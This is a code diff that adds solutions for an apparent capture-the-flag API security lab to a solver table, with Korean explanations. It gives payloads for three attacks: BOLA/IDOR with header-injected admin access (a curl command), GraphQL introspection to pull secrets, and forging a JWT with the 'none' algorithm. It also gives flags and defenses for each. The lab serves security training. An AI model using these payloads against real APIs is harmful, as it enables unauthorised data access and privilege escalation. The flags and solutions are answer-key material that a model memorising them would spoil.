@@ -348,6 +348,38 @@ SOLVERS: Dict[str, Dict[str, Any]] = {
                 "sample_output": "🎉 SecurityAccess Unlocked! -> FLAG{uds_security_access_seed_key_unlocked_3714}"
             }
         ]
+    },
+    "22": {
+        "title": "API 보안 & Modern Auth 실전 랩 (APIGuard)",
+        "steps": [
+            {
+                "step": 1,
+                "name": "BOLA / IDOR 타인 주문 조회 & BFLA 관리자 기능 탈취",
+                "target": "GET /api/v1/orders/order_9999 & GET /api/v1/admin/export_users (X-Admin-Role: internal_sec)",
+                "poc_explanation": "인증된 일반 세션에서 리소스 소유권 검증이 누락된 BOLA 취약점을 악용해 VIP 주문서를 열람하고, 클라이언트 제어 헤더 X-Admin-Role을 주입하여 관리자 기능(BFLA)을 무단 실행합니다.",
+                "exploit_payload": "curl -H 'X-Admin-Role: internal_sec' http://localhost:8022/api/v1/admin/export_users",
+                "defense": "DB 쿼리 시 소유권(WHERE user_id = :current_user) 강제 검증 및 헤더 기반이 아닌 서버 사이드 RBAC 토큰 검증 적용.",
+                "sample_output": "Admin users exported! FLAG{bola_idor_bfla_api_privilege_escalated_4822}"
+            },
+            {
+                "step": 2,
+                "name": "GraphQL Schema Introspection & Secret Vault 추출",
+                "target": "POST /graphql (query: query { systemSecrets { masterApiKey flag } })",
+                "poc_explanation": "프로덕션 환경에 노출된 __schema 인트로스펙션 쿼리를 통해 비공개 오브젝트 systemSecrets를 식별하고 숨겨진 마스터 API 키와 플래그를 탈취합니다.",
+                "exploit_payload": '{"query": "query { systemSecrets { masterApiKey flag } }"}',
+                "defense": "운영 배포 시 GraphQL Introspection을 비활성화하고 Field-level Authorization을 적용.",
+                "sample_output": "Extracted Vault: SEC_GRAPHQL_VIBE_KEY_9921_X -> FLAG{graphql_introspection_batching_bypass_7193}"
+            },
+            {
+                "step": 3,
+                "name": "JWT 'none' 알고리즘 서명 우회 & 관리자 권한 위조",
+                "target": "POST /api/v1/auth/jwt_verify (Authorization: Bearer <forged_none_token>)",
+                "poc_explanation": "헤더에 'alg': 'none'을 지정하고 페이로드의 role을 'admin'으로 변조한 뒤 서명부를 비운 채 전송하여 서버의 무서명 토큰 수용 취약점을 공격합니다.",
+                "exploit_payload": "token = base64url({'alg':'none','typ':'JWT'}) + '.' + base64url({'sub':'attacker','role':'admin'}) + '.'",
+                "defense": "JWT 검증 라이브러리 설정에서 'none' 알고리즘을 명시적으로 차단하고 화이트리스트 알고리즘만 허용.",
+                "sample_output": "Role Elevated: admin -> FLAG{jwt_alg_none_jwks_confusion_pwned_8842}"
+            }
+        ]
     }
 }
 
